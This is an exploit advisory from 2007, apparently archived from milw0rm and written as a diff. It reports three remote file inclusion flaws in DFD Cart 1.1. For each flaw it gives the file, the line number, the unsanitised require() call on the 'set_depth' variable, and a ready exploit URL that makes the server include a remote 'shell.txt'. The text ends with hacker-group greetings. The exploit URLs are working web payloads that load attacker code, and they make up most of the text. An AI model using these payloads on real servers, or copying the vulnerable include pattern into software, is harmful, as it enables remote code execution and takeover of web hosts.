@@ -1,0 +1,62 @@
+DFD Cart 1.1 Multiple Remote File Inclusion Vulnerabilities
+
+Vulnerability Type: Remote File Inclusion
+Vulnerable file: /dfd_cart/app.lib/product.control/core.php/product.control.config.php
+Exploit URL: http://localhost/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://localhost/shell.txt?
+Method: get
+Register_globals: On
+Vulnerable variable: set_depth
+Line number: 32
+Lines:
+
+----------------------------------------------
+
+require ("".$set_depth."app.lib/product.control/core.php/functions.php");
+
+
+----------------------------------------------
+
+Vulnerability Type: Remote File Inclusion
+Vulnerable file: /dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php
+Exploit URL: http://localhost/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth=http://localhost/shell.txt?
+Method: get
+Register_globals: On
+Vulnerable variable: set_depth
+Line number: 179
+Lines:
+
+----------------------------------------------
+$category_html = 'form_select';
+require ("".$set_depth."app.lib/product.control/core.php/category.list.php");
+?>
+
+----------------------------------------------
+
+Vulnerability Type: Remote File Inclusion
+Vulnerable file: /dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.search.php
+Exploit URL: http://localhost/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.search.php?set_depth=http://localhost/shell.txt?
+Method: get
+Register_globals: On
+Vulnerable variable: set_depth
+Line number: 154
+Lines:
+
+----------------------------------------------
+$category_html = 'form_select';
+require ("".$set_depth."app.lib/product.control/core.php/category.list.php");
+?>
+
+----------------------------------------------
+Multiple Remote Vulnerabilities
+
+GrEeTs To sHaDoW sEcUrItY TeAm & str0ke
+
+FoUnD By BiNgZa
+
+DoRk: :(
+
+shadowcrew@hotmail.co.uk
+
+http://shadow.wizhoo.com/
+
+# milw0rm.com [2007-09-24]
